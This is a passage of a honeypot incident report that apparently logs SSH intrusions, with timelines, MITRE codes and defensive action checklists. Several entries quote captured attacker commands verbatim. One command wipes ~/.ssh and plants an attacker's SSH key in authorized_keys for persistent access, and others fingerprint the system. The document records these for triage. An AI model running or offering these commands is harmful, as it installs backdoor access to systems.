| `2026-08-16 10:36:47` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.43.162[.]226` to AbuseIPDB if not already reported
- [ ] Block `175.43.162[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6171ed328592

| Field | Detail |
|---|---|
| **Source IP** | `124.239.169[.]52` |
| **First Seen** | 2026-08-16 10:36 |
| **Last Seen** | 2026-08-16 10:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:36:56` | `cowrie.session.connect` |
| `2026-08-16 10:36:57` | `cowrie.client.version` |
| `2026-08-16 10:36:57` | `cowrie.client.kex` |
| `2026-08-16 10:36:59` | `cowrie.login.success` |
| `2026-08-16 10:37:00` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.169[.]52` to AbuseIPDB if not already reported
- [ ] Block `124.239.169[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5b50805aef9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:37 |
| **Last Seen** | 2026-08-16 10:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:37:08` | `cowrie.session.connect` |
| `2026-08-16 10:37:08` | `cowrie.client.version` |
| `2026-08-16 10:37:08` | `cowrie.client.kex` |
| `2026-08-16 10:37:10` | `cowrie.login.success` |
| `2026-08-16 10:37:11` | `cowrie.session.params` |
| `2026-08-16 10:37:11` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.success` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.command.input` |
| `2026-08-16 10:37:12` | `cowrie.log.closed` |
| `2026-08-16 10:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df1a3a59fe6a

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 10:38 |
| **Last Seen** | 2026-08-16 10:38 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:38:10` | `cowrie.session.connect` |
| `2026-08-16 10:38:16` | `cowrie.client.version` |
| `2026-08-16 10:38:16` | `cowrie.client.kex` |
| `2026-08-16 10:38:40` | `cowrie.login.success` |
| `2026-08-16 10:38:51` | `cowrie.session.params` |
| `2026-08-16 10:38:51` | `cowrie.command.input` |
| `2026-08-16 10:38:58` | `cowrie.log.closed` |
| `2026-08-16 10:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9423e31ba13

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:38 |
| **Last Seen** | 2026-08-16 10:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:38:34` | `cowrie.session.connect` |
| `2026-08-16 10:38:34` | `cowrie.client.version` |
| `2026-08-16 10:38:34` | `cowrie.client.kex` |
| `2026-08-16 10:38:35` | `cowrie.login.success` |
| `2026-08-16 10:38:37` | `cowrie.session.params` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.success` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.command.input` |
| `2026-08-16 10:38:37` | `cowrie.log.closed` |
| `2026-08-16 10:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cccdd6945f10

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]241` |
| **First Seen** | 2026-08-16 10:38 |
| **Last Seen** | 2026-08-16 10:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:38:36` | `cowrie.session.connect` |
| `2026-08-16 10:38:36` | `cowrie.client.version` |
| `2026-08-16 10:38:36` | `cowrie.client.kex` |
| `2026-08-16 10:38:37` | `cowrie.login.success` |
| `2026-08-16 10:38:38` | `cowrie.session.params` |
| `2026-08-16 10:38:38` | `cowrie.command.input` |
| `2026-08-16 10:38:38` | `cowrie.command.failed` |
| `2026-08-16 10:38:39` | `cowrie.log.closed` |
| `2026-08-16 10:38:40` | `cowrie.session.params` |
| `2026-08-16 10:38:40` | `cowrie.command.input` |
| `2026-08-16 10:38:40` | `cowrie.session.file_download` |
| `2026-08-16 10:38:40` | `cowrie.log.closed` |
| `2026-08-16 10:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]241` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5db75888f0d

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]241` |
| **First Seen** | 2026-08-16 10:38 |
| **Last Seen** | 2026-08-16 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:38:40` | `cowrie.session.connect` |
| `2026-08-16 10:38:40` | `cowrie.client.version` |
| `2026-08-16 10:38:41` | `cowrie.client.kex` |
| `2026-08-16 10:38:42` | `cowrie.login.success` |
| `2026-08-16 10:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]241` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ab6e078399

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]241` |
| **First Seen** | 2026-08-16 10:38 |
| **Last Seen** | 2026-08-16 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:38:42` | `cowrie.session.connect` |
| `2026-08-16 10:38:42` | `cowrie.client.version` |
| `2026-08-16 10:38:42` | `cowrie.client.kex` |
| `2026-08-16 10:38:43` | `cowrie.login.success` |
| `2026-08-16 10:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]241` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74fd438704a1

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-08-16 10:38 |
| **Last Seen** | 2026-08-16 10:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:38:56` | `cowrie.session.connect` |
| `2026-08-16 10:38:57` | `cowrie.client.version` |
| `2026-08-16 10:38:57` | `cowrie.client.kex` |
| `2026-08-16 10:38:59` | `cowrie.login.success` |
| `2026-08-16 10:38:59` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad996ba83ea2

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-16 10:39 |
| **Last Seen** | 2026-08-16 10:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:39:04` | `cowrie.session.connect` |
| `2026-08-16 10:39:05` | `cowrie.client.version` |
| `2026-08-16 10:39:05` | `cowrie.client.kex` |
| `2026-08-16 10:39:06` | `cowrie.login.success` |
| `2026-08-16 10:39:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a579bddd0dcc

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 10:39 |
| **Last Seen** | 2026-08-16 10:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:39:07` | `cowrie.session.connect` |
| `2026-08-16 10:39:07` | `cowrie.client.version` |
| `2026-08-16 10:39:07` | `cowrie.client.kex` |
| `2026-08-16 10:39:08` | `cowrie.login.success` |
| `2026-08-16 10:39:08` | `cowrie.session.params` |
| `2026-08-16 10:39:08` | `cowrie.command.input` |
| `2026-08-16 10:39:09` | `cowrie.log.closed` |
| `2026-08-16 10:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c82f817457e

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-08-16 10:39 |
| **Last Seen** | 2026-08-16 10:39 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:39:14` | `cowrie.session.connect` |
| `2026-08-16 10:39:14` | `cowrie.client.version` |
| `2026-08-16 10:39:15` | `cowrie.client.kex` |
| `2026-08-16 10:39:18` | `cowrie.login.success` |
| `2026-08-16 10:39:20` | `cowrie.session.params` |
| `2026-08-16 10:39:20` | `cowrie.command.input` |
| `2026-08-16 10:39:20` | `cowrie.command.failed` |
| `2026-08-16 10:39:21` | `cowrie.log.closed` |
| `2026-08-16 10:39:22` | `cowrie.session.params` |
| `2026-08-16 10:39:22` | `cowrie.command.input` |
| `2026-08-16 10:39:23` | `cowrie.session.file_download` |
| `2026-08-16 10:39:23` | `cowrie.log.closed` |
| `2026-08-16 10:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ded791253a

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-08-16 10:39 |
| **Last Seen** | 2026-08-16 10:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:39:24` | `cowrie.session.connect` |
| `2026-08-16 10:39:24` | `cowrie.client.version` |
| `2026-08-16 10:39:24` | `cowrie.client.kex` |
| `2026-08-16 10:39:27` | `cowrie.login.success` |
| `2026-08-16 10:39:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705d0a2f968a

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-08-16 10:39 |
| **Last Seen** | 2026-08-16 10:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:39:28` | `cowrie.session.connect` |
| `2026-08-16 10:39:28` | `cowrie.client.version` |
| `2026-08-16 10:39:29` | `cowrie.client.kex` |
| `2026-08-16 10:39:32` | `cowrie.login.success` |
| `2026-08-16 10:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deecb7d72eab

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:40 |
| **Last Seen** | 2026-08-16 10:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:40:01` | `cowrie.session.connect` |
| `2026-08-16 10:40:02` | `cowrie.client.version` |
| `2026-08-16 10:40:02` | `cowrie.client.kex` |
| `2026-08-16 10:40:03` | `cowrie.login.success` |
| `2026-08-16 10:40:04` | `cowrie.session.params` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.success` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:04` | `cowrie.command.input` |
| `2026-08-16 10:40:05` | `cowrie.log.closed` |
| `2026-08-16 10:40:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf1edf07319

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:41 |
| **Last Seen** | 2026-08-16 10:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:41:29` | `cowrie.session.connect` |
| `2026-08-16 10:41:29` | `cowrie.client.version` |
| `2026-08-16 10:41:29` | `cowrie.client.kex` |
| `2026-08-16 10:41:31` | `cowrie.login.success` |
| `2026-08-16 10:41:32` | `cowrie.session.params` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.success` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.command.input` |
| `2026-08-16 10:41:32` | `cowrie.log.closed` |
| `2026-08-16 10:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa058e1ae316

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-08-16 10:41 |
| **Last Seen** | 2026-08-16 10:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:41:52` | `cowrie.session.connect` |
| `2026-08-16 10:41:53` | `cowrie.client.version` |
| `2026-08-16 10:41:53` | `cowrie.client.kex` |
| `2026-08-16 10:41:55` | `cowrie.login.success` |
| `2026-08-16 10:41:57` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:42:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6ec3de1483c

| Field | Detail |
|---|---|
| **Source IP** | `117.158.166[.]73` |
| **First Seen** | 2026-08-16 10:42 |
| **Last Seen** | 2026-08-16 10:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:42:02` | `cowrie.session.connect` |
| `2026-08-16 10:42:03` | `cowrie.client.version` |
| `2026-08-16 10:42:03` | `cowrie.client.kex` |
| `2026-08-16 10:42:05` | `cowrie.login.success` |
| `2026-08-16 10:42:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 10:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.158.166[.]73` to AbuseIPDB if not already reported
- [ ] Block `117.158.166[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2631cd046152

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-16 10:42 |
| **Last Seen** | 2026-08-16 10:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 10:42:57` | `cowrie.session.connect` |
| `2026-08-16 10:42:57` | `cowrie.client.version` |
| `2026-08-16 10:42:57` | `cowrie.client.kex` |
| `2026-08-16 10:42:58` | `cowrie.login.success` |
| `2026-08-16 10:43:00` | `cowrie.session.params` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.success` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.command.input` |
| `2026-08-16 10:43:00` | `cowrie.log.closed` |
| `2026-08-16 10:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b9d511d1dcd

| Field | Detail |
|---|---|
| **Source IP** | `183.239.20[.]236` |
| **First Seen** | 2026-08-16 10:44 |
| **Last Seen** | 2026-08-16 10:44 |
